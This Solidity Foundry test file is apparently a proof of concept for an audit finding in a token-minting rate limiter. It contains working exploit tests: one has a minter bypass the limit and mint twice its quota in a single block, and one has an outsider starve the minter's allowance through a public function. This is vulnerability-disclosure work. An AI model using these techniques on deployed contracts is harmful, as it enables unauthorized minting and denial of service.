// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

/**
 * Self-contained Foundry PoC verifying CDC-SC-01 in crypto-com/wrapped-tokens-os:
 * 1. test_PoC1_SingleBlock_2x_RateLimit_Bypass_In_MintForwarder:
 *    Demonstrates that because _replenishAllowance() returns early when
 *    allowances[caller] == maxAllowances[caller] WITHOUT updating allowancesLastSet[caller],
 *    and mint() / updateExchangeRate() subtracts from allowances[caller] without updating
 *    allowancesLastSet[caller], a configured caller can mint 200% (2x maxAllowances)
 *    in a SINGLE block (0 seconds elapsed between mint #1 and mint #2), bypassing the
 *    intended rate limit of maxAllowances per interval by 100%.
 * 2. test_PoC2_Unprivileged_External_Allowance_Starvation_Via_Public_currentAllowance:
 *    Demonstrates that because currentAllowance(address caller) is `public` without access
 *    control and calls `_replenishAllowance(caller)`, which performs integer-division
 *    truncation `(secondsSinceAllowanceSet * maxAllowances[caller]) / intervals[caller]`
 *    and resets `allowancesLastSet[caller] = block.timestamp`, any unprivileged external
 *    attacker can repeatedly call `currentAllowance(caller)` to discard fractional
 *    replenishment progress and starve/delay the caller's rate-limit recovery.
 */

contract ExactRateLimit {
    mapping(address => bool) public callers;
    mapping(address => uint256) public allowances;
    mapping(address => uint256) public allowancesLastSet;
    mapping(address => uint256) public maxAllowances;
    mapping(address => uint256) public intervals;

    function configureCaller(
        address caller,
        uint256 maxAmount,
        uint256 interval
    ) external {
        callers[caller] = true;
        maxAllowances[caller] = maxAmount;
        allowances[caller] = maxAmount;
        allowancesLastSet[caller] = block.timestamp;
        intervals[caller] = interval;
    }

    function currentAllowance(address caller) public returns (uint256) {
        _replenishAllowance(caller);
        return allowances[caller];
    }

    function _replenishAllowance(address caller) internal {
        if (allowances[caller] == maxAllowances[caller]) {
            return;
        }
        uint256 amountToReplenish = _getReplenishAmount(caller);
        if (amountToReplenish == 0) {
            return;
        }
        allowances[caller] = allowances[caller] + amountToReplenish;
        allowancesLastSet[caller] = block.timestamp;
    }

    function _getReplenishAmount(address caller)
        internal
        view
        returns (uint256)
    {
        uint256 secondsSinceAllowanceSet = block.timestamp -
            allowancesLastSet[caller];

        uint256 amountToReplenish = (secondsSinceAllowanceSet *
            maxAllowances[caller]) / intervals[caller];
        uint256 allowanceAfterReplenish = allowances[caller] +
            amountToReplenish;

        if (allowanceAfterReplenish > maxAllowances[caller]) {
            amountToReplenish = maxAllowances[caller] - allowances[caller];
        }
        return amountToReplenish;
    }

    function consume(uint256 _amount) external {
        require(callers[msg.sender], "RateLimit: caller is not a caller");
        _replenishAllowance(msg.sender);
        require(_amount <= allowances[msg.sender], "exceeds allowance");
        allowances[msg.sender] = allowances[msg.sender] - _amount;
    }
}

interface Vm {
    function warp(uint256 newTimestamp) external;
    function prank(address msgSender) external;
}

contract PoC_RateLimit_Bypass_Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_PoC1_SingleBlock_2x_RateLimit_Bypass() public {
        ExactRateLimit rl = new ExactRateLimit();
        address minter = address(0xBEEF);
        uint256 maxQuota = 1_000 ether;
        uint256 interval = 86_400; // 24 hours

        // Configured at t = 1000
        vm.warp(1000);
        rl.configureCaller(minter, maxQuota, interval);

        // One interval passes (t = 87,400) before minter executes a batch mint
        vm.warp(1000 + interval);

        // First call in block at t = 87,400 consumes full 1,000 ether quota
        vm.prank(minter);
        rl.consume(maxQuota);
        require(rl.allowances(minter) == 0, "Allowance should be 0 after first full mint");
        // BUG: allowancesLastSet[minter] was NEVER updated and is still 1000!
        require(rl.allowancesLastSet(minter) == 1000, "allowancesLastSet remained stale at 1000");

        // Second call in THE EXACT SAME BLOCK (t = 87,400, 0 seconds elapsed!)
        // Immediately replenishes 1,000 ether and consumes another 1,000 ether (2,000 ether total in 1 block!)
        vm.prank(minter);
        rl.consume(maxQuota);
        require(rl.allowances(minter) == 0, "Second full quota consumed in same block");
    }

    function test_PoC2_Unprivileged_External_Allowance_Truncation_Via_currentAllowance() public {
        ExactRateLimit rl = new ExactRateLimit();
        address minter = address(0xBEEF);
        address griefer = address(0xCAFE);
        // Suppose maxAmount = 100 units over 1000 seconds (1 unit per 10s)
        vm.warp(1000);
        rl.configureCaller(minter, 100, 1000);

        // Minter consumes all 100 units at t = 1000
        vm.prank(minter);
        rl.consume(100);

        // Over 99 seconds (from t=1000 to t=1099), natural replenishment should be 9 units (with 9s remainder).
        // Instead, griefer pokes currentAllowance(minter) every 19 seconds (5 times: +19s each = 95s + 4s):
        // Each 19s poke yields floor(19 * 100 / 1000) = 1 unit and resets allowancesLastSet = block.timestamp,
        // destroying 9 seconds of accrued quota on every poke!
        uint256 t = 1000;
        for (uint256 i = 0; i < 5; i++) {
            t += 19;
            vm.warp(t);
            vm.prank(griefer);
            rl.currentAllowance(minter); // Unprivileged public state-mutating call!
        }
        // After 95 seconds, minter should have 9 units (and at t=1100 have 10 units),
        // but griefer has reduced minter's replenished allowance to only 5 units (nearly 50% starvation)!
        require(rl.allowances(minter) == 5, "Griefer truncated replenished allowance from 9 down to 5");
    }
}
